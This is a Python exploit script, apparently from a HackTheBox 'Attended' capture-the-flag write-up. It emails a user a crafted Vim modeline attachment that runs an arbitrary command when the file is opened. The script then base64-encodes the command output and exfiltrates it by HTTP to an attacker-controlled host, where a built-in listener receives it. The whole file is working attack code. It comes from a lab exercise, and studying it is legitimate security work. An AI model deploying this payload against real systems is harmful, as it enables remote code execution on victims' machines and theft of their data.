#!/usr/bin/python3

##############
##  0xdf
##  https://0xdf.gitlab.io/2021/05/08/htb-attended.html
##
##

import base64
import smtplib
import socket
import sys
from datetime import datetime
from email.message import EmailMessage


command = sys.argv[1]
payload = f''':!python2 -c "import requests, os, base64; path = '/'; res = os.popen('{command}').read(); f = base64.b64encode(res); requests.get('http://10.10.14.14/' + f)"|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
print(f'[+] Email sent at {datetime.now()}. Listening on 80 for RCE response.')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 80))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f'[+] Connection from {addr[0]} at {datetime.now()}')
        data = conn.recv(8096)
        b64 = data.split(b' ')[1][1:]
        print(base64.b64decode(b64).decode(errors='ignore'))
        
##
##
##
